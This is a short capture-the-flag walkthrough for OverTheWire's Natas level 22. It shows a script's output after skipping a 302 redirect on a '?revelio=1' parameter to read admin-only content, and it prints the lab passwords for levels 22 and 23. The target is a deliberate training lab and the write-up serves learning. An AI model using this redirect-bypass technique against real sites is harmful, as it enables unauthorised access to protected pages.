# Natas22 — OverTheWire

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/BANNER.png" width="100%"/>](https://github.com/mauzware)

## 📸 Credentials

```
Username: natas22
Password: d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz
URL:      http://natas22.natas.labs.overthewire.org
```

---

## 🧠 Walkthrough

- Access the site using credentials.

- This is a cool main page:

  <img src=""/>

- You have to access `?revelio=1`, but when you visit that endpoint you will be redirected. So, I wrote a script that just hit that endpoint and get the response from the server.

  ```
  $ python3 natas22.py          
  302
  /
  
  
  <html>
  <head>
  <!-- This stuff in the header has nothing to do with the level -->
  <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
  <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
  <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
  <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
  <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
  <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
  <script>var wechallinfo = { "level": "natas22", "pass": "d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz" };</script></head>
  <body>
  <h1>natas22</h1>
  <div id="content">
  You are an admin. The credentials for the next level are:<br><pre>Username: natas23
  Password: dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs</pre>
  <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
  </div>
  </body>
  </html>
  ```

- Done.

---

## 🏁 Password for the next level

`Password for natas23 is: dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs`

---

Back to [Main Repo](https://github.com/mauzware/OverTheWire-Natas)
